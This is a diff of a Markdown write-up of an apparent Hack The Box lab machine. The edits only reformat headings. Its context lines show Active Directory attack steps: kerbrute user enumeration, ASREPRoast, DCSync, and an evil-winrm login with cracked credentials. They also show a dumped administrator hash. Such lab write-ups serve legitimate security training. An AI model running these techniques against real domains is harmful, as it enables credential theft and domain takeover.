@@ -4,7 +4,7 @@
 ```
 If Active Directory => [[Synchronize NTP]] with the domain controller.
 
-# Content
+### Content
 
 - RPC Enumeration
 - ASREPRoast attack [X] Kerbrute enumeration [✓] impacket-getNPUsers
@@ -13,7 +13,7 @@ If Active Directory => [[Synchronize NTP]] with the domain controller.
 - DCSync Attack through WriteDacl permission
 - Creation of a User and addition to special group
 
-# Reconnaissance
+### Reconnaissance
 
 Initial reconnaissance for TCP ports
 ```bash
@@ -145,7 +145,7 @@ user:[andy] rid:[0x47e]
 user:[mark] rid:[0x47f]
 user:[santi] rid:[0x480]
 ```
-# Exploitation
+### Exploitation
 If we generate a list with all this users, we can try to abuse the [[ASREPRoast Attack]] with kerbrute:
 ```bash
 kerbrute userenum -d htb.local --dc 10.10.10.161 users                                        
@@ -204,7 +204,7 @@ Then with this credentials, we are able to access to the system using [[Evil-win
 ```powershell
 evil-winrm -i 10.10.10.161 -u 'htb.local\svc-alfresco' -p 's3rvice'
 ```
-# Root privesc
+### Privilege Escalation
 Lets simply enumerate privileges from users, groups and network:
 ```powershell
 # users
@@ -395,18 +395,18 @@ C:\Windows\system32> whoami
 nt authority\system
 ```
 And we are NT Authority\\System
-# Credentials
+### Credentials
 ```bash
 svc-alfresco:s3rvice
 administrator: Hash-> aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
 ```
 
-# Notes
+### Notes
 
 - Sometimes is better to use the impacket utility and sometimes use other options, such as in this case, kerbrute didn't retrieve the hash correctly, but using impacket-GetNPUsers we were able to choose the format output of the hash to crack it with hashcat.
 - Similar to the previous scenario, to do a DCSync Attack we can use impacket-secretsdump, but in this case that utility didn't work, so our other option was secretsdump.py
 
-# Resources:
+### References
 
 None
 
